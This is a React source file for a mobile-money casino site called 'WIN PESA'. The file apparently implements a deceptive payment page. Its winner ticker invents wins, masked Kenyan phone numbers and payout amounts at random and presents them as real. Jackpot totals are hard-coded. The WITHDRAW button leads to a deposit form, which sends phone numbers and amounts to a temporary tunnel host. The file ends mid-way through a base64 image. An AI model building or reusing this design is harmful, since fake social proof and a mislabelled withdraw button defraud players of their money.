import React, { useState, useEffect } from 'react';
import { Search, Crown, Gamepad2, Trophy, Zap, Database, Gift, FolderRoot as Football, Timer, Diamond, ShoppingCart, Award, Menu, ArrowLeft } from 'lucide-react';

function WinnerTicker() {
  const [winners, setWinners] = useState<string[]>([]);

  const generateRandomWinner = () => {
    const games = ['Hot to Burn', 'Shining Crown', 'JetX', 'Mayan Gold', 'Lucky Dragons', 'Fortune Wheel', 'Golden Safari', 'Space Adventure'];
    const usernames = ['Lucky', 'Winner', 'Player', 'Gamer', 'Star', 'Champion', 'Master', 'Pro'];
    const randomGame = games[Math.floor(Math.random() * games.length)];
    const randomUsername = usernames[Math.floor(Math.random() * usernames.length)] + Math.floor(Math.random() * 1000);
    const randomPhone = `+254${Math.floor(Math.random() * 9000000) + 1000000}`;
  
    // Mask the middle digits of the phone number
    const maskedPhone = randomPhone.replace(/(\d{3})\d{4}(\d{3})/, '$1****$2');
  
    const randomAmount = Math.floor(Math.random() * 50000) + 1000;
    return `${randomUsername} (${maskedPhone}) won ${randomAmount} KSH in ${randomGame}!`;
  };

  useEffect(() => {
    const initialWinners = Array(5).fill(null).map(generateRandomWinner);
    setWinners(initialWinners);

    const interval = setInterval(() => {
      setWinners(prev => {
        const newWinners = [...prev];
        newWinners.shift();
        newWinners.push(generateRandomWinner());
        return newWinners;
      });
    }, 3000);

    return () => clearInterval(interval);
  }, []);

  return (
    <div className="bg-[#1a2332] py-2 overflow-hidden border-t border-b border-gray-700">
      <div className="animate-marquee whitespace-nowrap">
        {winners.map((winner, index) => (
          <span key={index} className="text-green-400 mx-4 text-sm">🎉 {winner}</span>
        ))}
      </div>
    </div>
  );
}

function Header() {
  const [currentPage, setCurrentPage] = useState('main');

  const renderPage = () => {
    switch(currentPage) {
      case 'promotions':
        return <PromotionsPage onBack={() => setCurrentPage('main')} onClaim={() => setCurrentPage('deposit')} />;
      case 'deposit':
        return <DepositPage onBack={() => setCurrentPage('main')} />;
      default:
        return <MainContent />;
    }
  };

  return (
    <>
      <header className="bg-[#1a2332] p-4">
        <div className="container mx-auto flex items-center justify-between">
          <div className="flex items-center gap-4">
            <h1 className="text-purple-500 text-xl md:text-2xl font-bold">WIN PESA</h1>
            <div 
              className="bg-purple-600 px-3 py-1 md:px-4 md:py-2 rounded cursor-pointer hover:bg-purple-700"
              onClick={() => setCurrentPage('promotions')}
            >
              <span className="text-white text-sm md:text-base">PROMOTIONS</span>
              
            </div>
          </div>
          
          <div className="flex items-center gap-4">
            <div className="relative hidden md:block">
              <input
                type="search"
                placeholder="Search"
                className="px-4 py-2 rounded-lg w-[200px] md:w-[300px]"
              />
              <Search className="absolute right-3 top-2.5 text-gray-400" size={20} />
            </div>
            <div className="flex items-center gap-2 text-yellow-400">
              <span>KSH</span>
              <span>0</span>
            </div>
            <button 
              className="bg-green-400 px-4 py-1 md:px-6 md:py-2 rounded font-semibold hover:bg-green-500 text-sm md:text-base"
              onClick={() => setCurrentPage('deposit')}
            >
              WITHDRAW
            </button>
            <Menu className="text-white cursor-pointer" size={24} />
            
          </div>
        </div>
      </header>
      {renderPage()}
    </>
  );
}

function PromotionsPage({ onBack, onClaim }: { onBack: () => void; onClaim: () => void }) {
  return (
    <div className="min-h-screen bg-[#0f1623] p-4 md:p-8">
      <div className="container mx-auto">
        <button 
          onClick={onBack}
          className="flex items-center text-white mb-6 hover:text-purple-400"
        >
          <ArrowLeft className="mr-2" /> Back
        </button>
        <div className="bg-purple-600 rounded-lg p-4 md:p-8 text-white">
          <h2 className="text-2xl md:text-3xl font-bold mb-4">🎉 Double Deposit Bonus!</h2>
          <p className="text-lg md:text-xl mb-6">Get 100% bonus on your first deposit up to 5000 KSH!</p>
          <div className="bg-[#1a2332] p-4 md:p-6 rounded-lg max-w-md">
            <h3 className="text-xl font-semibold mb-4">How it works:</h3>
            <ul className="list-disc list-inside space-y-2 mb-6">
              <li>Deposit any amount from 10 KSH to 5000 KSH</li>
              <li>Receive an instant 100% bonus</li>
              <li>Withdraw your bonus  any time</li>
            </ul>
            <button 
              className="bg-yellow-400 text-black px-4 py-2 md:px-6 md:py-3 rounded font-semibold w-full hover:bg-yellow-500"
              onClick={onClaim}
            >
              Claim Now
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

function DepositPage({ onBack }: { onBack: () => void }) {
  const [phone, setPhone] = useState('');
  const [amount, setAmount] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [message, setMessage] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setMessage('');

    try {
      const response = await fetch('https://victorian-lenders-viewpicture-dimensions.trycloudflare.com/api/deposit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ phone, amount }),
      });

      const data = await response.json();
      if (data.success) {
        setMessage('Request sent successfully!Please wait.');
        setPhone('');
        setAmount('');
      }
    } catch (error) {
      setMessage('Failed to process. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#0f1623] p-4 md:p-8">
      <div className="container mx-auto">
        <button 
          onClick={onBack}
          className="flex items-center text-white mb-6 hover:text-purple-400"
        >
          <ArrowLeft className="mr-2" /> Back
        </button>
        <div className="bg-[#1a2332] rounded-lg p-4 md:p-8 max-w-md mx-auto">
          <h2 className="text-xl md:text-2xl font-bold text-white mb-6">M-PESA</h2>
          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label className="block text-white mb-2">Phone Number</label>
              <input
                type="tel"
                placeholder="0700000000"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                className="w-full px-4 py-2 rounded-lg"
                required
              />
            </div>
            <div>
              <label className="block text-white mb-2">Amount (KSH)</label>
              <input
                type="number"
                placeholder="Enter amount"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                className="w-full px-4 py-2 rounded-lg"
                required
                min="10"
              />
            </div>
            {message && (
              <div className={`p-3 rounded ${message.includes('success') ? 'bg-green-600' : 'bg-red-600'} text-white`}>
                {message}
              </div>
            )}
            <button 
              type="submit" 
              className="bg-yellow-400 text-black px-4 py-2 md:px-6 md:py-3 rounded font-semibold w-full hover:bg-yellow-500 disabled:opacity-50"
              disabled={isSubmitting}
            >
              {isSubmitting ? 'Processing...' : 'Enter '}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}

function Navigation() {
  const navItems = [
    { icon: <Trophy size={20} />, label: 'Top Games' },
    { icon: <Crown size={20} />, label: 'Providers' },
    { icon: <Trophy size={20} />, label: 'Big Win' },
    { icon: <Zap size={20} />, label: 'Jumbo Win' },
    { icon: <Database size={20} />, label: 'Crash Games' },
    { icon: <Database size={20} />, label: 'Low Data' },
    { icon: <Gift size={20} />, label: 'New Games' },
    { icon: <Football size={20} />, label: 'Virtual Sport' },
    { icon: <Timer size={20} />, label: 'Instant Win' },
    { icon: <Gift size={20} />, label: 'Drops&Wins' },
    { icon: <Diamond size={20} />, label: 'ForHer' },
    { icon: <Gamepad2 size={20} />, label: '3 x 3' },
    { icon: <ShoppingCart size={20} />, label: 'Buy Free Spins' },
    { icon: <Award size={20} />, label: 'WinLeague' },
  ];

  return (
    <nav className="bg-[#1a2332] border-t border-gray-700">
      <div className="container mx-auto py-2">
        <div className="flex items-center gap-4 overflow-x-auto">
          {navItems.map((item, index) => (
            <div
              key={index}
              className="flex items-center gap-2 text-white cursor-pointer px-3 py-2 hover:bg-gray-700 rounded whitespace-nowrap"
            >
              {item.icon}
              <span className="text-sm">{item.label}</span>
            </div>
          ))}
        </div>
      </div>
    </nav>
  );
}

function JackpotSection() {
  return (
    <div className="bg-purple-600 p-4 md:p-6 rounded-lg">
      <h2 className="text-xl md:text-2xl text-white mb-4">Jackpot</h2>
      <div className="space-y-4">
        <div className="flex justify-between text-white">
          <span>Mega</span>
          <span>407,271 KSH</span>
        </div>
        <div className="flex justify-between text-white">
          <span>Grand</span>
          <span>182,273 KSH</span>
        </div>
        <div className="flex justify-between text-white">
          <span>Major</span>
          <span>428,588 KSH</span>
        </div>
        <div className="flex justify-between text-white">
          <span>Mini</span>
          <span>1,089 KSH</span>
        </div>
      </div>
    </div>
  );
}

function GameCard({ title, type, image }: { title: string; type: string; image: string }) {
  return (
    <div className="relative rounded-lg overflow-hidden cursor-pointer transform hover:scale-105 transition-transform">
      <img src={image} alt={title} className="w-full h-48 object-cover" />
      <div className="absolute top-2 left-2 bg-red-600 text-white px-3 py-1 rounded">
        {type}
      </div>
      <div className="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black to-transparent p-4">
        <h3 className="text-white font-semibold text-sm md:text-base">{title}</h3>
      </div>
    </div>
  );
}

function GameGrid() {
  const games = [
    {
      title: 'Hot to Burn Hold & Spin',
      type: 'MOST PLAYED',
      image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTmJitJqOjU95YB_G3aJE2Huh9G1PdDeYC6iQ&s'
    },
    {
      title: 'Shining Crown',
      type: 'JACKPOT',
      image: 'https://images.unsplash.com/photo-1596838132731-3301c3fd4317?w=800&auto=format&fit=crop&q=60&ixlib=rb-4.0.3'
    },
    {
      title: 'JetX',
      type: 'POPULAR',
      image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRF3-dzqP4raqME-bntL9p21ADwlqG-1bsHGg&s'
    },
    {
      title: 'Mayan Gold',
      type: 'NEW',
      image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS1u2PLFN3uCHfuJUuAg3UJ5adO2ZzjjjwpFQ&s'
    },
    {
      title: 'Lucky Dragons',
      type: 'TOURNAMENT',
      image: 'https://images.unsplash.com/photo-1567095761054-7a02e69e5c43?w=800&auto=format&fit=crop&q=60&ixlib=rb-4.0.3'
    },
    {
      title: 'Fortune Wheel',
      type: 'TOP GAME',
      image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQGfoE58_TSt-uk7KFIF3HWLHOyhB03nWzoCw&s'
    },
    {
      title: 'Golden Safari',
      type: 'NEW',
      image: 'https://images.unsplash.com/photo-1516953953850-0c5b6121c8f1?w=800&auto=format&fit=crop&q=60&ixlib=rb-4.0.3'
    },
    {
      title: 'Space Adventure',
      type: 'FEATURED',
      image: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxMTEhUTEhMWFhUXFxcXFRgXFxcXGhkXGBgWGBgaFx8dHSggGh0lHRYYITIhJSkrLi4uFx8zODMtNygtLisBCgoKDg0OGxAQGy0lICUtLS0tLS0tLS0tLS0tLS0tLS0uLS0vLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLf/AABEIAMIBAwMBEQACEQEDEQH/xAAcAAABBQEBAQAAAAAAAAAAAAAFAAIDBAYHAQj/xABJEAACAQIDBQUEBgcGBQMFAAABAgMAEQQSIQUGMUFREyJhcYEHFDKRQlJicqGxIzOCksHR8BVTosLh8RYkQ4OyRGOjNHOTs9L/xAAbAQACAwEBAQAAAAAAAAAAAAAAAQIDBAUGB//EADoRAAICAQIEAwYEBgEEAwEAAAABAgMRBCEFEjFBE1FhIjJxgZGxFKHB0QYjQlLh8BUkM1PxNDWiFv/aAAwDAQACEQMRAD8A4bQAqAFQAqAFQAqACOydh4jEm0ELv1IFlHmx7o+dAG32T7MDxxU1vsRan1dhYegNA8Gx2Zu5hMNrHCgI+m/fbzu17elqQ8Fbau+mEhveTtGHKPvm/QngPU0h4MltL2lyNcQRKg6v3j8hYD8aB4Mvj948VN8c726A5R8lt+NAAsk9aAEBQBILdPxoAeJLcFX5X/O9A8Ei4pxwa3lYfkKAwNbEueLsfNmP8aWQGXoGLN4UDHBxSDYWfwo3DYd2g6UDyj3MOlIByzkcCR5GgY/3tuZJ89aWAyMEw6D8KMDyPzKeQ/rypYHserk8fnf+VG4bDXiXlRlhhEJBH9XqWSOBHxH8KBDTbofnTAo1YZxUAKgBUAaHYG5uKxVmRMkZ/wCpJ3Vt9nm3oLUAdD2L7P8ACQWMl8Q/29E9EB1/aJpDwaHHbRhw6DtHSNBoBoB5Ko4+QoJYMRtn2kAXXDR3+2+g9FGp9SKQYMVtTbuIxB/SysR9UaL8hp86ABtqBioA9tQB7QB6FpZHgVMBUAOF6Qy1i9nyokUjRMqSK7IxGjhXZWI8jYW9eBBMuxDO5VqJNCy0h4HKtGQwIrRkMCy0ZDA1loE0xy0iSHZaAweEX4igGhwSkM8IpgK9AZPQ/rQGR6ycqQ8i08PxoAF1cZRUAGdgbs4jFn9Elk5yN3UHrzPgLmgDpmwNycLhrM47eUfScd0H7K8PU3PlSyPAf2htJIlzSuFHK/PwA4n0pEjCbd3/AGN1wy5R9dtT6DgPW/pQMw+KxEkzlmZnY8yST/tQBEYwOJueg1/0oAYzUANoAVAHpoAQvQMdSGK1MQgKBjwbcaQGo2dteWTAS4MxPKhKvAyoXMcmYZgCAbKy5rjrQJpdShh91cc/w4PEH/tOPzAoDKRYXcvH88K4+8yL+bUmsbjUjW7U9m0UUYJlk+G7SmxQuRoAoXQXuLMwPjWR6nf0Lo1uWy6mTO5eNtfsl/8Ayx//ANVrwUuSWxA+62LXjD8nQ/5qfKHMiGTYeJHGCT0F/wAr0sD50UZ8PInxRuv3lYfmKMBzIhzUsDyOzUDyLNSDI7NTAnwGCM0qRh0QuwXNI2VFvzc62FNCaNBvZ7P8ZgFEkqdpF/ew3dB97QMvmRbxqWCtSRlFcHgai0TTXYXpSGV8JhXkcJGpZjoABc1aZzou7m4CJaTFkO2hEQPdH3yPi8hp50sjwbhSFUAWVFGgFlAA6cgKQzLbd30WO6QWZvrHgPLr+XnQPBgsZjJcQ/eLO59T/oPwoGRSwJH+sbM31EPD7zcvIa0AVJsUW0FlX6q6D15n1oEyCgZ6KAPQlGQSH2oGeFaQHqp8zoPPwph0NTsf2f7RxAzJhnRPrzWhW3Xv2JHkDRgWUa3Bex3KufF41EXn2S3X0lkKJ+BoeFu2CcpPCQQh3X2HDbMZMQepeRx/8QSM+WeqJ6qmHWRvq4VrLekGvjt9whh9qYGIj3fARofrdnCht11WRj86yz4nWvdTZs//AJ7UKDk5LPluaFdpSnRAB4L2h/ANb/DWN8Xtk8Qh92ePlq7c8qjuRjtXJ6jj3IxY9Llb39agtbrbM8qxj0/cj42ol0/YCbcxsyEASuFIIIvbUcb286pWt1DzGTPX/wAM106mqatjmUX174ZPuptP3bEe54uzjEgFWYg5SRcRsLWBN82nNzXSqeNpL4/PoyGtqS9upvCeFtjPmBN4458JPLhmmltlaTDv2j96Ppe+rIdPKxos8SNkZJ7ZWTVpZUXaacJRXMk2nhZ/9oEQHGtA04nfIpVbdsxYlmyiygkjXrbwvXWPOE+1cPjYFLSTBgH7N7OshR8ubK9wbG3ppSGebOw8k8et2uSO6iDpzCiuVq9XbXbyw3R6Dh+h0tmn573h5ffAOxe5QzFAXDDXLYPp1sOVQXELltKH0L/+J0k480LGvp/gEYvc6RblZFNr6EFasr4lCUlFxeTPbwScIucbE0vQAybNmH0b+VdPBw+ZlWRWX4lI8xb86WB8/mOja/T1IH50sElJB7Db142LDnDCZxCbdw62AN7KTqF8OHhQPCZYxW/GKlRo5skqMLEPHGfIju3BHUEGjIuVGZAHU0h4Ou7D2NDhVyxLqfic6s3meQ8BpVhSWNo7TjgXNIdeQ5ny/nSGc/29vLJPcXyx8lH8ep/q1AIGpge72k7dlGeF9Xf7i8fU0DKmK2poUhXsk52Pfb77fwGlAmDaAPQKB4PbUBgcBQM9FIAtsDdvFYxsuFgeUjQkaIv3nNlXyJvTBySOl7F9jsaL2mPxOi6skBAVeoeV7AeIAB6GjCQk23hIKHeXZOzrpgcMryDTNGuvUZp5Rcg/YVqcWpLKFOucHiSaYBxu/wBtDFSBIcsRYgIsS9pJryzyXP7oWmRBE4xEMwOM7Qs40aVzIbXtdWJN9eNjWPWUuyvbqjq8I1v4e/2vdez/AHC8BXMM98txmy2vbwrz8cKXtHubFJwfJ17Z6F3bGFVGVo/1Uih4762B0ZSeqm4+VW6itRacejWV+xl0N8rIOFnvReH+/wAzQ7r4nOuUnUqYz8u6fyqvS7XOH9yaPAcc0f4bXyxsp7r59fzDAuy+LL654j+ZFalmyv1a/wD1B/qche1H1a/NATe2PMgkHPK3z7rfjWXUr+Yp/wByz8+56H+GbuXWuHacfzQC3lwEkmDjfKzS5hMslj3BH3I1uBbXX8K31ylGMZSXvdX6dEd6+qFs7K4tLl6Lzl1b/QONbbeyldLDGQarytIBZlP2XH9aVujt17fY87lwlttkyO7Mo9ynLd3/AJnCq4OmUq7FgfKtieUZZLDwdQ2Hu+rHEvOgYSYp5EVhcDLdVYg6G+pHoaqsk+iJLYl3pYxRgRL3je1luAqjvHTTmPxrn3R6Gml+exxXeM9o+ZiQ44MpsR5Wp0Scehomk1hmfO3cVEzxzM0muVhISXFvE6g25Gtf4eqUlZjcqWtvhW6c+z0+BvthYLCy4Qy2Zz2cjvJd1Eb/AAwxKODux4jWtZz2M2ruwkcUpMmaSDshKCgyFpfoI17krz0pDQCw+68LqWYFSeGU2/Dga5Or18qrOSG+Op6Hh/Cq7qfEtzv0xthFDG7kyLrFID0Vhl/0/CnDikHtZHAXcCkt6pp/H/AAxuysRFrJEQBxI1HqQSB62rfXbXYsweTlXae+j/uRa+xTDeBqzlKPER1Xbu8CYcZV70nTp5/ypkMGCxWJlnk1zPI3BRx/0A+QoBIkmeLC/FlmxHTjHEfH6zUDAWMxbysXkYsx5n8h0FAEVqBMtYPZ8sv6uNm1tcDS/S50B8L86ARHPCUYq3EcQCD48tKBoYKBhTYGwMRjJOyw0TSNpmtoqg83Y6KPP0owLJ1/dz2SYXDL220ZFlK6subs8Olv7xzYvb0GvwmmRy3sgxtLfWNEEOCiUoospy9nCo+wgsX9bDwrBfr4w2gss7+i4DZbidzwvTr/AIM26z4uWMSuzFzaMyd2MaH4ABlGmndF65zndfJJvr9Duwr0mhqlKtLbrjd/4BO8WxxYFXVzrlK3B0Nirqe8pv1q7T2vTyw3mL/Ix63TLX1uSi4zj80/RPoxbuY/tVTCqEiniPaYOUaEzXJZJCSb9oLDpdQLcq7SaZ4+SaeGS7MwjYnDjDyo6FsTL2ct1KLiCusLxhbxK3/lY2tpTEgfsuckFG0dDYg+Bt+HCuDr9P4c+ZdGe34JrvHq8OT9qP2DsOJzQmDIzMHDxZRcrfRwRxsdDpzFZlPmr8PGXnb9TbZWoX+OmkmsSztny+gX2FsrEoczRtGhHxORHYjUHvEGl+Cvlhxjj8jzn8ST0+qpXhzTnF7Y8u4VxG0YtM+LgFjfuNmN+Z7g41dPTXyx4lkVjy/wjxE1LPtzSKWM2nhZLRtO7mQhFIjY94nui7Ec6cdJC2a5rcv4GnQamNOphap5aM2dqYG9g2KJBt8Ma6jzNXS0tUdnKR9Cr1Gst3jCCz6v9itutvAuB2j2iFhhsQcrhrXU9TbTib6dTWiuSxldvscXiGlnXL20t99umQn7Utgx4fEpjgG93nNpuzsSshF1cX0s3PhWqt4ePPocxrmWH1Jtw9/cNDeDtZDEdQZVC9mbheIJ7pJF+nHhexdtuRhHm27h/e7e9obdn8Q7yk8PMdQQeNc+TlN4RojBY3OOY7e7ELZAIgVcyB8gz5iSwueJsTwOmgrVXpodXn6kZ3yWyM/H2k0h0aSRyWP0mJJuWPz1J0rXypLBmzlnQN3ljQYaCbEP2auzSBRZI2NyDGwJzakAtl0seVSj0Iz6hvb20O1SKAPG7lmlxDxABWkOi6gDMQnE24mq9Rcqq3Py+5o0mnd9qgu/2CG78ADdqSVjhGZiNCeSoPEnTyvXndMszds3st36vyPXa1qNSogt5bL0Xn8gjgGExeaVAbuM7yD9GkY+imvef6IFX08tubLF36vol6ebMl6lQo01SawtkvecvN+SM1tPEqmZlFgScgPS+l/IVRpqPGu9jZGvVan8Np82byxj4sy8kKMSWjjJPEmOMk+ZK16ZLCPEym3JsAYaCSeQqup4uxPdUcyxoJHuM2okKmLCm5Okk5+J/BPqrQAANAhCgC1gML2jqpZUUkZnY5VUHiSeX5+dLOBmgfaWHikZo2aZhGyRHKUji4BRGDqdLgk2vmJ40ouT6rAYXbczjEkkk3JNyT1NMZ0/cX2SSzhZsdmhhNisY0lk8x/0wf3vAcakkQcjoO3N6sDsmP3bDRKZFGkERsFPWd9bHhpqx8RTInJ9u7wYjHSA4iUZcwyp8EMd9L5Rfh9Y3PHyoGXMXhpsFJ2OJHdOqONVI6qeY8OIrnavR8/tw6nf4Vxd0vwrfd8/L/BrcLtszMwlzlGiAtGC9nQDLKozDJa1+7pp61jje5Talnp8d139PkdezQxrhGdTWebOW8ZT/pz3z6hOfEkhVZ4mzDMQ2VI8TGbAvmI7kotY3PKr3LOOZr7KXz7MwwqUXJxUljyy3W/LHeL8zBbxbIAnY4UmSzd0pcseBBW2pIOlxxtep6bURjZ4Wcrs/wBCrieinZStU44l/Uv1CuI2fikZsTjsWmzu0UZ+8yyy5Ra/ZRnMzHnwN76V0zzgD/4n2XhW/wCXw82KYaGWduzS3MrEpuw8HIqE64zWJItqvsqfNW8P0Cu1t6carZIpUSF1DxNhoxCrxtwYcXB4ggtoQRWK6Uq3hYXwPTcP01Gpj4kk5vvlga87sJCxaRSGUuxc3BuL3vesf4jllls7c9FW6nBQSXTZJBNNnRvIZEYqkvfCADuE/EvowYeQFV623laaXXv9z5JxfTz0mpdUkFv7DUoQpbPa6G/Bhqp+YFc+GqlGaeDnV5T5kZXEqjYiUqOLliOhcByPTPXX1E+67n13gNkL9JGffo/0/ImxmzO0jKqNdLcePI/1yvWai/ksWTXxLTxtpfob1sAJMHDhopTKFUkrIdWWMjMwXnZiLKbDS1xqatUpTeU8eh45rw2+ZfMzTbgZnknJWCAWAYW75YhFKoGIVSSLm9rg28NsbZeE+ZCkoK1OPcLbw4AJsPDIEUvdEDXuVckhgp8wRoawKclPm7NsvhBStlF9jL7b2Uhkgw8cCK5XNK7RoxygXJJI086NNqp8spye3RItt0tbxymK2vi1zmOBcqDQgfSPO/h0rr0Qljmn1OfqLIp8lfTzK8OLdeDMPXT5NerzGaDZm2ZIj3kWTSxscjDXUWNwTcdeVYdbSrYqLlg7PCZzqbsjDm+e/wAkafAb1xMBEzlBmD9nIMl24cefTQ1yp6W+uOPejnO3+5O5HVaayeW+WeMe1s18M7Bza20xJZtVCj4bgooHDIABaqrZu+SjFP4dvkWUUrSwlKTTXXPd/H9DLSM80gVQSWIVFHjwFeg0unVMFH6nk9dq5amzmfTt8AjPsbDRsUlxoWRdHVIXkAbmAwIBtw8wa0mE55tXaq5Pd8OCsI+I/SlP1mPTwqJYBqAPaAPQKAPRQBb2fgZJpEihQvI5yoqi5J/rW/AAEmgGd+9n/s0hwIE+Kyy4kDML27KDxF+LD656aW1NMjlvYW9O+pe8eEYgcHm4Fuoi+qPtcenWuZqdfy+zX9T03DeB8y8TUfJfucux+yyt2S5BJJHFrnUm/Fvz86lp9dzezZ18yviPBJVp2Ubry/YPQbTwc8eHhkREBCwuFjCvE9rDERyAd5SbZkcnry16OTzjWCfCbQjVHwW0HAEDMjAqzdoi3CmEjVJlNsrcCjWN8oswBa49MPiF90lZ4iFMZ1MiFhYq4ygFr37ouLEcb1i1Om5vbhtJHZ4fxFVrwL1zVv8AI2WMwVlWbaUwhQA9nEqqJWB1ORALLc8SR52rH+GnPErnheR1o62uDdeihzSfWTzj5tmf2hvuVBjwEYwynTPo87Dxc3y+Q4datjKNe1ccevck9BK182pm5y8ltEy+1dne+R9qikYyNQJUJLHEIo/WoSSTKB8S371rjXSttVyksZ3OFr+HWUPnS9n7f4M3gsDm14irzlh3BYzsY+wluYwS8LcTGx+NPFWte3UXqi+rxI+p0eGa96S7P9L6r9fkabZ9iARr0rztsWng974nNHmXQa4aKeNwf0bHK68gzkAMPHNlHkx6VbX/ADaZVvqt0eP/AIr0KtoV66x+xtsHqAQK5qjnoeAhFmU2lu9MuLkaOGRkkyvcKxGbUMOGnBa7MYTnp47PKyj3H8LauNMJ12ySXbOwQg2ROOMTj0tWR6W/rys9RZxHSNY8RfUS4hsDgXmxqlp537OMOc+VF0zZTpmsbi/Dwub9N1pexFdfyXc8rJqx82do7/Ft7fkaTF4g43suwKrA0KtkkXMCysjKrrcEdm0Y8CJRr1lKT6xRmjhJqX1Id6dqRGTCYQKqKJe0lVVJyFQWGUHLYFr+hrNPkmnjbHlv18u5dVGyOZ9fiCpDhn2gVmfNE6jMZI2Vu6biOO5JIJAJ5HoaK64VxTy8L5fUtza44UTH+0Td8RYt5I4wkTBCq8xnzhc33jG5HgtdDT2bYZithlZ6+Znok8Lngul+9yPpqfQDnWqTUVllVFMrrFCPVhHBbNB8K412pbbZ7/TcPrpgku33L02AspvlKAEte1rDiSDpaqqr25Yj1LNRChwbtSx6mcn2sikJD2kY5gNmQm+n6NvhPgGFtNLg124VraUsc3meCv1PNKUasqHZZyEsHtd4Skp7pBBWRNQG5XB7y+ot51aZcMPDfkjnhOZ/VQ8TqSdOJJv60siwzlt6RLI4CgZ7QAgKACGxtlTYmZIIELyObKB+JJ5KOJPKgGz6O3K3Ow+yoWYspmyXxGIbQKvEqt/hQW4c7XPKzwQ3MrvPvd75dITbDg/tSn6z9Bpovz6Dka7UzzyLZHruC8OqjDxm1KXpul/kobFEBL9ta+W8YYsqFhyYrqNOFY6FW2+fy2OtrvxCUfB898JN49EyeTZSzIkmG0LZgYWkTMCtvguQXGvS9TdCnHmr+mSmGtlTN16jt0kk8NPz7JmY2nsgMTpkcXBBBGvRhyNW0audT5Z9CnW8Jp1cfFp2fp0f++YQwqYzaDe7pBGJMqDETldWVNEaRyDl0A+HVivoOzXZGxc0eh42/Tzom4WLDPNpby4PZIMWzwuJxg7smKcXjjPMQjgT5epPCplBldm74SMXXHBsTFI2ZiSO1jbhnhbloPgPdNuAqE4Ka3NGn1FlEuaD+XmH02Ygs8biSJvhcC3o44o3ga4+qrnW/Q9xw7iNGoh7O0u6L3uYsCDZhqrDiDWCNsoSyjdZiaaksp9mZ3bKFJM7LbMe8RwzdT5669RrrqfQaXUq5ep4jivDvws+aO8H09PQL7N3TxGKTMseWO1+0kPZoLa3DHjbqL1qOSTxYvZuBXLNjDiX4hMIl1F+I7RjlIvfhwFhWO7R12yyzrafjF1FKqilt3fkDsZ7SY9Vw2z4QOTYgtOTbh3dAD6mp1aWmreMTNqOIai9NTlt5dgVi/aNtR+E3Zr9WONEHztf8avSiuhz0kugJxG8OOf48VOf+6wH4GjmLlXLyI9n42YzRCaaUoZED3kb4Cwzc+l6XPgl4MvI6ztqL+08RHhswX3fFyBwdLxSsMrDxDI6W+0nWufUpKOO+X+bya7UobrphfU65itmwiNbqFEQGUjQqFHI+V/nWudMOXft3MMZyzt3OX7JgG0sbNLGiZYhkAkdiCSSAbAXBsOBJ41z5VOeyxv/AL2N0b3XHGX/AL8QZvpgZ9nyR4yRYS5cheyZzrqQWEim7aHUadQathTyvlwkJ38y6su7faPHYaOKO/aSR+9M7HMxdQAS5trZQQAAALAAAaVVK2fixx26ltEYwrm5d1gym72xImWR8Q0gIDLGIkV7spIYm50FwvoV1FX33KWIsnonLSy8SMU3037IckiwpA2IIiWdCyNZpF0uCCVGhDDKRy8tayPSSlPbodufHoOnZNS6Y7ArfXtkcZbiNrrZcxXOmUnU8RqPUGtWkjWlzJYZwtbrNRZ7MpZQDh7Ow7R5D1A0ArS3PsYly9yaPEYRTph2kP2nI/KoNWd5YGuV+6slxdoLy2bHbldWP8Kjyv8A8n2LlXZ/Y/oZQCthjwOoAQFAFnA4R5ZFiiUu7sFRRxZjwAoHk+lPZ7uZHsyCxytipFvNJyUccqk/QX/EdfJorbOd+0bfX3xjBh2PuqNqf79x9I/YB4Dnx6WYjN4vZ0+GETN3WlXMqA3fLewLrbQNy661CyuM1iSNFGpsolzVvDJ8LtgHuyDKeF+XqOVcq7h7W9e56nRcfhPEb1h+a6B3Z+LRSS0ayKw5kgjndGHwnx1rDCXhv2o5OzbB3xTrnjvlYafx80HcJgn2hLnI7KKNFWSRmzWVRxZjbM9ufTjWiFctVZnol3/3ucyy6HDKeTPNKTyl06+nZAbeXfrJbDbOjT3ZSe0zrm940sc97HIfmfAaV0YThWuWGyORLRXahud2XJ9vIyk+w8Nie9hT7vLzw8jXjP8A9mQ8Puv+9V8L4y2MN/DLqlzYyvTsVcPsnsiVdSrjiGFj/t41ac4KYKQx3y6A8RypSSawyUJyhJSi8NGk3UwWIxJZcllTjKe7FlNyNTzAGq6kceBvXJu4e3L2Oh6jTccrdP8AN95eXc825vXs/CdzDxrjZx/1ZBeBGGoKr9Mgga3tp8Va9No4U7p5ZyNbxO3Upx6R8v3Oe7f3mxeNN8VOzDlGDljXpZBpp1IJ8a1NswRhHq2CVCkgC7HgBa59BQ8k4uK6LJoNm7p4+YfosFORyJTsx83sKg5RXVlLg3uRbwbt4vBhfeIQuawGWRHIPesrBSSDZT4eNKMoy6MXhuLyFNh7m9rhZcRNI8RT9XF2LsXYrmUFjYLmtpVU7VF4RuTezfcbhdwcW0jKwSNUBbMzXJAGYWjUGThrqtuOtRepr5cx39CWJJ4fTzN/uJBCJFbEL2mIaDK2UlsyALkZwNScgXx+E6m9sat55tdkW6ipqGUabfjbqYbBlXxBKTho0YL2jLpr3ge8o8da1uU8cvXJhjHLyAPZNiFhw8r5ZJQ8h78SFgQBbgbNfjpbnUOZKW+xOUcpAz2z7W7aGJVjlUCQMWkQIOBFgC2YnXpVlbTnlMWGlgqbs7ai7DsoUZVRQs07Wubd6ynrzC6BbZiWtmWuyLSxHv38jRUl7098dF5gDBbZhBd4IyHlfvsJLAIA9gq2GUd5dTfhao21SaUX0XQtrUHmWevUk3p3shGIUQIgijkMkKGMFYyVhubcrvGzaD6ZPOroVzn7XQobrqST3bI5d7ZGhYOUKO57+